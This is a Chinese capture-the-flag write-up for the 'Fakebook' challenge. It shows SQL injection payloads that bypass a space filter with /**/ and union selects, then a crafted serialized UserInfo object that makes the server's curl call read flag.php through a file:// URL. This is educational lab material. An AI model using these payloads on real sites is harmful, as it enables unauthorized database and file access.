## 0x01 Fakebook

本题考点为SQL注入和SSRF，首先随意注册一个账户，进行登录后发现网址为

```
http://125afc2e-8d0c-4333-9d75-14d7fa2d63f1.node3.buuoj.cn/view.php?no=1
```

推断no=1为可注入点

进行注入后发现屏蔽空格，将空格换为`/**/`进行绕过屏蔽字，构造payload完成SQL注入获取内部的信息

Payload：

```
no=1 order by 4#  //发现order by 5时出现报错，推断有四列
no=0/**/union/**/select 1,2,3,4#  //通过报错页面得知2有回显
no=0/**/union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#
                //爆表名发现有一个users表
no=0/**/union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#
                //爆字段名发现username、passwd和data，username和passwd没有发现flag，data中发现一个反序列化对象
no=0/**/union/**/select 1,group_concat(data),3,4 from users#  //爆出data的值
```

发现data值为

```
O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:1;s:4:"blog";s:9:"1.1.1.com";}
```

同时使用dirsearch扫描目录发现`user.php.bak`![](/assets/捕鱼.png)下载`user.php.bak`发现定义可反序列化类UserInfo

```
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

发现\`function get函数中存在exec执行函数，但安全，因而将重点转向于curl\_getinfo\(\)函数。

发现可以采用file://伪协议进行文件读取，并且已知flag.php和view.php均位于/var/www/html/目录下，故构造payload：

```
$a = new UserInfo('1',2,'file://var/www/html/flag.php');
```

获取反序列化字符串，得到

```
O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:2;s:4:"blog";s:28:"file://var/www/html/flag.php";}
```

将反序列化字符串放入url中构造payload：

```
no=0/**/union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:2;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#
```



